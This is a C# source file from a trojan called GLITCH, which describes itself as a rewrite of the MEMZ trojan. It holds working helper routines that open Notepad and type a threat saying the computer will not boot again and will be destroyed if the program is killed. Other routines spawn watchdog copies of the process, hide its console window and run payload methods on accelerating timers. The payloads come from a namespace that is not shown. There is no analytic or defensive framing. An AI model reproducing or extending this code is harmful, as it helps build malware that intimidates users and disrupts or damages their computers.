﻿using System;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using CC_Functions.W32;
using GlitchPayloads;

namespace Misc
{
    public static class StandardCommands
    {
        public static Thread GetRunner(MethodInfo method, int RunAfter, int DefaultDelay) =>
            new Thread(() =>
            {
                while (RunAfter < Common.TimePassed) Thread.Sleep(1000);
                while (true)
                {
                    method.Invoke(null, new object[0]);
                    Thread.Sleep(Math.Max((int) (DefaultDelay * Common.DelayMultiplier), 50));
                }
            });

        public static void ShowNotepad()
        {
            Process proc = Process.Start("notepad.exe");
            proc.WaitForInputIdle();
            Wnd32.fromHandle(proc.MainWindowHandle).isForeground = true;
            const string msg =
                "YOUR COMPUTER HAS BEEN FUCKED BY GLITCH,\nA REWRITE OF THE MEMZ TROJAN.\n\nYour computer won't boot up again,\nso use it as long as you can!\n\n:D\n\nTrying to kill GLITCH will cause your system to be\ndestroyed instantly, so don't try it :D";
            SendKeys.SendWait(msg);
        }

        public static void RunWDs()
        {
            for (int i = 0; i < WatchDog.WDC; i++)
                Process.Start(Process.GetCurrentProcess().MainModule.FileName, "wd");
        }

        public static void HideCmd() => Wnd32.fromHandle(Process.GetCurrentProcess().MainWindowHandle).shown = false;

        public static void LaunchIncrementor()
        {
            new Thread(() =>
            {
                Thread.Sleep(1000);
                Common.TimePassed++;
                Common.DelayMultiplier = Math.Max(240 / Common.TimePassed, float.Epsilon);
            }).Start();
        }

        public static MethodInfo GetMethodInfo(Action d) => d.Method;
    }
}